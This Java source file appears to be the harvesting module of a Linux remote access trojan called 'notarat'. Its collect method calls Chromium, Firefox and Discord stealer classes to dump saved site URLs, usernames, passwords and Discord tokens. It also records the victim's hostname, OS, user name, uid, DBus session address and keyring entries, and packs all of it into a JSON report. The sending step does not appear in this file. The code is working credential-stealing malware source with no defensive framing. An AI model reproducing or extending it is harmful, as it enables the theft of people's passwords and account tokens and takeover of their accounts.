package dev.xotic.notarat.harvest;

import dev.xotic.notarat.apps.DiscordStealer;
import dev.xotic.notarat.browser.ChromiumStealer;
import dev.xotic.notarat.browser.FirefoxStealer;
import dev.xotic.notarat.crypto.LinuxKeyring;
import dev.xotic.notarat.dbus.DbusConn;

import java.net.InetAddress;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;

public final class Harvest {

    private static final String[] CRED_FIELDS =
            { "browser", "profile", "url", "username", "password" };

    private static final String[] DISCORD_FIELDS =
            { "app", "client", "path", "token" };

    public static String collect() {
        List<Map<String, String>> rows   = new ArrayList<>();
        List<Map<String, String>> tokens = new ArrayList<>();
        Map<String, Integer> counts = new TreeMap<>();
        List<String> diag = new ArrayList<>();

        try {
            List<Map<String, String>> c = new ChromiumStealer().dump();
            rows.addAll(c);
            counts.put("chromium", c.size());
        } catch (Throwable t) {
            counts.put("chromium", 0);
            diag.add("chromium_exc=" + t);
        }

        try {
            List<Map<String, String>> f = new FirefoxStealer().dump();
            rows.addAll(f);
            counts.put("firefox", f.size());
        } catch (Throwable t) {
            counts.put("firefox", 0);
            diag.add("firefox_exc=" + t);
        }

        try {
            List<Map<String, String>> d = new DiscordStealer().dump();
            tokens.addAll(d);
            counts.put("discord", d.size());
        } catch (Throwable t) {
            counts.put("discord", 0);
            diag.add("discord_exc=" + t);
        }

        Map<String, List<Map<String, String>>> grouped = new TreeMap<>();
        for (Map<String, String> r : rows) {
            grouped.computeIfAbsent(r.getOrDefault("browser", "Unknown"),
                    k -> new ArrayList<>()).add(r);
        }
        Map<String, String> meta = new LinkedHashMap<>();
        meta.put("ver",            "1.0.3");
        meta.put("hostname",       hostname());
        meta.put("os",             System.getProperty("os.name") + " " + System.getProperty("os.version"));
        meta.put("arch",           System.getProperty("os.arch"));
        meta.put("user",           System.getProperty("user.name"));
        meta.put("uid",            String.valueOf(DbusConn.uid()));
        meta.put("dbus",           String.valueOf(System.getenv("DBUS_SESSION_BUS_ADDRESS")));
        meta.put("total_browser",  String.valueOf(rows.size()));
        meta.put("total_discord",  String.valueOf(tokens.size()));
        meta.put("count_chromium", String.valueOf(counts.getOrDefault("chromium", 0)));
        meta.put("count_firefox",  String.valueOf(counts.getOrDefault("firefox", 0)));
        meta.put("count_discord",  String.valueOf(counts.getOrDefault("discord", 0)));
        meta.put("keyring_candidates",
                String.valueOf(LinuxKeyring.fetchAll("brave").size()));
        meta.put("browsers",       String.join(",", grouped.keySet()));
        meta.put("diag",           diag.isEmpty() ? "" : String.join("; ", diag));
        StringBuilder sb = new StringBuilder();
        sb.append("{\n");
        sb.append("  \"meta\": ")
                .append(orderedJson(meta, meta.keySet().toArray(new String[0]), 2))
                .append(",\n");
        sb.append("  \"creds\": [");
        int written = 0;
        for (List<Map<String, String>> bucket : grouped.values()) {
            for (Map<String, String> r : bucket) {
                if (written++ > 0) sb.append(',');
                sb.append("\n    ").append(orderedJson(r, CRED_FIELDS, 2));
            }
        }
        if (written > 0) sb.append('\n');
        sb.append("  ],\n");
        sb.append("  \"discord\": [");
        int dw = 0;
        for (Map<String, String> t : tokens) {
            if (dw++ > 0) sb.append(',');
            sb.append("\n    ").append(orderedJson(t, DISCORD_FIELDS, 2));
        }
        if (dw > 0) sb.append('\n');
        sb.append("  ]\n");

        sb.append("}");
        return sb.toString();
    }

    private static String orderedJson(Map<String, String> m, String[] order, int depth) {
        StringBuilder sb = new StringBuilder("{");
        boolean first = true;
        for (String k : order) {
            if (!m.containsKey(k)) continue;
            if (!first) sb.append(", ");
            first = false;
            sb.append(quote(k)).append(": ").append(quote(m.get(k)));
        }
        return sb.append("}").toString();
    }

    private static String hostname() {
        try { return InetAddress.getLocalHost().getHostName(); }
        catch (Exception e) { return "unknown"; }
    }

    private static String quote(String s) {
        if (s == null) return "null";
        StringBuilder sb = new StringBuilder("\"");
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n");  break;
                case '\r': sb.append("\\r");  break;
                case '\t': sb.append("\\t");  break;
                default:
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
            }
        }
        return sb.append("\"").toString();
    }

    private Harvest() {}
}